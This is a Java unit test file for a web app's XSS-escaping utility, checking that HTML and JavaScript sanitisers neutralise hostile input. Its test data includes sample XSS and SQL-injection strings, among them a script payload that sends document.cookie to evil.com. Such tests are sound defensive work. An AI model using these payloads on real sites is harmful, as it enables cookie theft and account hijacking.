// File: src/test/java/com/example/adventcalendar/util/XssUtilsTest.java
package com.example.adventcalendar.util;

import static org.assertj.core.api.Assertions.*;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

@DisplayName("XssUtils 단위 테스트")
class XssUtilsTest {

	@Nested
	@DisplayName("HTML 이스케이프 - 단일 입력")
	class SanitizeHtmlSingle {

		@Test
		@DisplayName("일반 텍스트는 변경 없음")
		void sanitizeHtml_PlainText_NoChange() {
			// given
			String input = "안녕하세요";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).isEqualTo("안녕하세요");
		}

		@Test
		@DisplayName("script 태그 이스케이프")
		void sanitizeHtml_ScriptTag_Escaped() {
			// given
			String input = "<script>alert('xss')</script>";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).doesNotContain("<script>");
			assertThat(result).doesNotContain("</script>");
			assertThat(result).contains("&lt;script&gt;");
			assertThat(result).contains("&lt;/script&gt;");
		}

		@Test
		@DisplayName("img 태그 이스케이프")
		void sanitizeHtml_ImgTag_Escaped() {
			// given
			String input = "<img src=x onerror=alert('xss')>";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).doesNotContain("<img");
			assertThat(result).contains("&lt;img");
		}

		@Test
		@DisplayName("iframe 태그 이스케이프")
		void sanitizeHtml_IframeTag_Escaped() {
			// given
			String input = "<iframe src='javascript:alert(1)'></iframe>";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).doesNotContain("<iframe");
			assertThat(result).doesNotContain("</iframe>");
			assertThat(result).contains("&lt;iframe");
		}

		@Test
		@DisplayName("a 태그 이스케이프")
		void sanitizeHtml_AnchorTag_Escaped() {
			// given
			String input = "<a href='javascript:void(0)'>클릭</a>";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).doesNotContain("<a");
			assertThat(result).contains("&lt;a");
		}

		@Test
		@DisplayName("특수 문자 이스케이프")
		void sanitizeHtml_SpecialCharacters_Escaped() {
			// given
			String input = "< > & \" '";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).contains("&lt;");
			assertThat(result).contains("&gt;");
			assertThat(result).contains("&amp;");
			assertThat(result).contains("&#34;");
			assertThat(result).contains("&#39;");
		}

		@Test
		@DisplayName("null 입력 시 null 반환")
		void sanitizeHtml_NullInput_ReturnsNull() {
			// when
			String result = XssUtils.sanitizeHtml((String) null);

			// then
			assertThat(result).isNull();
		}

		@Test
		@DisplayName("빈 문자열은 빈 문자열 반환")
		void sanitizeHtml_EmptyString_ReturnsEmpty() {
			// given
			String input = "";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).isEmpty();
		}

		@Test
		@DisplayName("여러 태그가 섞인 경우 모두 이스케이프")
		void sanitizeHtml_MultipleTags_AllEscaped() {
			// given
			String input = "<script>alert('xss')</script><img src=x onerror=alert(1)>";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).doesNotContain("<script>");
			assertThat(result).doesNotContain("<img");
			assertThat(result).contains("&lt;script&gt;");
			assertThat(result).contains("&lt;img");
		}

		@Test
		@DisplayName("이벤트 핸들러 이스케이프")
		void sanitizeHtml_EventHandler_Escaped() {
			// given
			String input = "<div onclick='alert(1)'>클릭</div>";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			// HTML 태그가 이스케이프되어 실행 불가능
			assertThat(result).doesNotContain("<div");
			assertThat(result).doesNotContain("</div>");
			assertThat(result).contains("&lt;div");
			assertThat(result).contains("&lt;/div&gt;");
			assertThat(result).contains("&#39;"); // 작은따옴표 이스케이프
		}

		@Test
		@DisplayName("SQL 인젝션 시도 문자열 이스케이프")
		void sanitizeHtml_SqlInjection_Escaped() {
			// given
			String input = "'; DROP TABLE users; --";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).contains("&#39;");
		}

		@Test
		@DisplayName("일반 텍스트와 태그 혼합")
		void sanitizeHtml_MixedContent_EscapesOnlyTags() {
			// given
			String input = "안녕하세요 <script>alert('xss')</script> 반갑습니다";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).contains("안녕하세요");
			assertThat(result).contains("반갑습니다");
			assertThat(result).doesNotContain("<script>");
			assertThat(result).contains("&lt;script&gt;");
		}
	}

	@Nested
	@DisplayName("HTML 이스케이프 - 배열 입력")
	class SanitizeHtmlArray {

		@Test
		@DisplayName("배열의 모든 요소 이스케이프")
		void sanitizeHtml_Array_AllElementsEscaped() {
			// given
			String[] inputs = {
				"<script>alert(1)</script>",
				"<img src=x>",
				"일반 텍스트"
			};

			// when
			String[] results = XssUtils.sanitizeHtml(inputs);

			// then
			assertThat(results).hasSize(3);
			assertThat(results[0]).contains("&lt;script&gt;");
			assertThat(results[0]).doesNotContain("<script>");
			assertThat(results[1]).contains("&lt;img");
			assertThat(results[1]).doesNotContain("<img");
			assertThat(results[2]).isEqualTo("일반 텍스트");
		}

		@Test
		@DisplayName("null 배열 입력 시 null 반환")
		void sanitizeHtml_NullArray_ReturnsNull() {
			// when
			String[] result = XssUtils.sanitizeHtml((String[]) null);

			// then
			assertThat(result).isNull();
		}

		@Test
		@DisplayName("빈 배열은 빈 배열 반환")
		void sanitizeHtml_EmptyArray_ReturnsEmpty() {
			// given
			String[] inputs = {};

			// when
			String[] results = XssUtils.sanitizeHtml(inputs);

			// then
			assertThat(results).isEmpty();
		}

		@Test
		@DisplayName("배열 내 null 요소 처리")
		void sanitizeHtml_ArrayWithNull_HandlesNull() {
			// given
			String[] inputs = {
				"<script>alert(1)</script>",
				null,
				"일반 텍스트"
			};

			// when
			String[] results = XssUtils.sanitizeHtml(inputs);

			// then
			assertThat(results).hasSize(3);
			assertThat(results[0]).contains("&lt;script&gt;");
			assertThat(results[1]).isNull();
			assertThat(results[2]).isEqualTo("일반 텍스트");
		}

		@Test
		@DisplayName("단일 요소 배열 처리")
		void sanitizeHtml_SingleElementArray_Escaped() {
			// given
			String[] inputs = {"<script>xss</script>"};

			// when
			String[] results = XssUtils.sanitizeHtml(inputs);

			// then
			assertThat(results).hasSize(1);
			assertThat(results[0]).contains("&lt;script&gt;");
		}
	}

	@Nested
	@DisplayName("JavaScript 이스케이프")
	class SanitizeJavaScript {

		@Test
		@DisplayName("일반 텍스트는 변경 없음")
		void sanitizeJavaScript_PlainText_NoChange() {
			// given
			String input = "안녕하세요";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).isEqualTo("안녕하세요");
		}

		@Test
		@DisplayName("작은따옴표 이스케이프")
		void sanitizeJavaScript_SingleQuote_Escaped() {
			// given
			String input = "It's a test";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).doesNotContain("'");
			assertThat(result).contains("\\x27");
		}

		@Test
		@DisplayName("큰따옴표 이스케이프")
		void sanitizeJavaScript_DoubleQuote_Escaped() {
			// given
			String input = "Say \"hello\"";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).doesNotContain("\"");
			assertThat(result).contains("\\x22");
		}

		@Test
		@DisplayName("백슬래시 이스케이프")
		void sanitizeJavaScript_Backslash_Escaped() {
			// given
			String input = "C:\\path\\to\\file";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).contains("\\\\");
		}

		@Test
		@DisplayName("null 입력 시 null 반환")
		void sanitizeJavaScript_NullInput_ReturnsNull() {
			// when
			String result = XssUtils.sanitizeJavaScript(null);

			// then
			assertThat(result).isNull();
		}

		@Test
		@DisplayName("빈 문자열은 빈 문자열 반환")
		void sanitizeJavaScript_EmptyString_ReturnsEmpty() {
			// given
			String input = "";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).isEmpty();
		}

		@Test
		@DisplayName("JavaScript 코드 이스케이프")
		void sanitizeJavaScript_JavaScriptCode_Escaped() {
			// given
			String input = "alert('xss')";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).doesNotContain("'");
			assertThat(result).contains("\\x27");
		}

		@Test
		@DisplayName("개행 문자 이스케이프")
		void sanitizeJavaScript_NewLine_Escaped() {
			// given
			String input = "첫 줄\n둘째 줄";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).contains("\\n");
		}

		@Test
		@DisplayName("JavaScript 문자열 이스케이프")
		void sanitizeJavaScript_StringEscape() {
			// given
			String input = "alert('test')";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).contains("\\x27"); // 작은따옴표 이스케이프
			assertThat(result).doesNotContain("'");
		}

		@Test
		@DisplayName("JavaScript 특수 문자 일부 이스케이프")
		void sanitizeJavaScript_SpecialCharacters_PartiallyEscaped() {
			// given
			String input = "& \" ' /";

			// when
			String result = XssUtils.sanitizeJavaScript(input);

			// then
			assertThat(result).contains("\\x26"); // &
			assertThat(result).contains("\\x22"); // "
			assertThat(result).contains("\\x27"); // '
			assertThat(result).contains("\\/");   // /
		}
	}

	@Nested
	@DisplayName("실전 시나리오 테스트")
	class RealWorldScenarios {

		@Test
		@DisplayName("사용자 이름 입력 - XSS 공격 시도")
		void userNameInput_XssAttempt_Blocked() {
			// given
			String maliciousName = "<script>fetch('http://evil.com?cookie='+document.cookie)</script>";

			// when
			String sanitized = XssUtils.sanitizeHtml(maliciousName);

			// then
			assertThat(sanitized).doesNotContain("<script>");
			assertThat(sanitized).contains("&lt;script&gt;");
		}

		@Test
		@DisplayName("편지 내용 - HTML 태그 포함")
		void letterContent_HtmlTags_Escaped() {
			// given
			String content = "안녕하세요 <b>진하게</b> <img src=x onerror=alert(1)>";

			// when
			String sanitized = XssUtils.sanitizeHtml(content);

			// then
			assertThat(sanitized).doesNotContain("<b>");
			assertThat(sanitized).doesNotContain("<img");
			assertThat(sanitized).contains("&lt;b&gt;");
			assertThat(sanitized).contains("&lt;img");
		}

		@Test
		@DisplayName("색상 선택 - 예상치 못한 입력")
		void colorSelection_UnexpectedInput_Escaped() {
			// given
			String maliciousColor = "green' onclick='alert(1)";

			// when
			String sanitized = XssUtils.sanitizeHtml(maliciousColor);

			// then
			assertThat(sanitized).contains("&#39;"); // ' escaped
		}

		@Test
		@DisplayName("여러 필드 동시 처리")
		void multipleFields_SimultaneousProcessing() {
			// given
			String name = "<script>alert(1)</script>";
			String content = "<img src=x onerror=alert(2)>";
			String from = "<iframe src='evil.com'></iframe>";

			// when
			String[] sanitized = XssUtils.sanitizeHtml(name, content, from);

			// then
			assertThat(sanitized).hasSize(3);
			assertThat(sanitized[0]).doesNotContain("<script>");
			assertThat(sanitized[1]).doesNotContain("<img");
			assertThat(sanitized[2]).doesNotContain("<iframe");
		}

		@Test
		@DisplayName("긴 문자열 처리 성능")
		void longString_Performance() {
			// given
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < 1000; i++) {
				sb.append("<script>alert(").append(i).append(")</script>");
			}
			String longInput = sb.toString();

			// when
			long startTime = System.currentTimeMillis();
			String result = XssUtils.sanitizeHtml(longInput);
			long endTime = System.currentTimeMillis();

			// then
			assertThat(result).doesNotContain("<script>");
			assertThat(endTime - startTime).isLessThan(1000); // 1초 이내
		}

		@Test
		@DisplayName("유니코드 문자 처리")
		void unicodeCharacters_Preserved() {
			// given
			String input = "안녕하세요 🎄 메리크리스마스 ❤️";

			// when
			String result = XssUtils.sanitizeHtml(input);

			// then
			assertThat(result).contains("안녕하세요");
			assertThat(result).contains("🎄");
			assertThat(result).contains("메리크리스마스");
			assertThat(result).contains("❤️");
		}

		@Test
		@DisplayName("URL 입력 - 프로토콜 공격")
		void urlInput_ProtocolAttack_Escaped() {
			// given
			String maliciousUrl = "javascript:alert('xss')";

			// when
			String sanitized = XssUtils.sanitizeHtml(maliciousUrl);

			// then
			assertThat(sanitized).contains("javascript");
			assertThat(sanitized).contains("&#39;"); // ' escaped
		}
	}
}
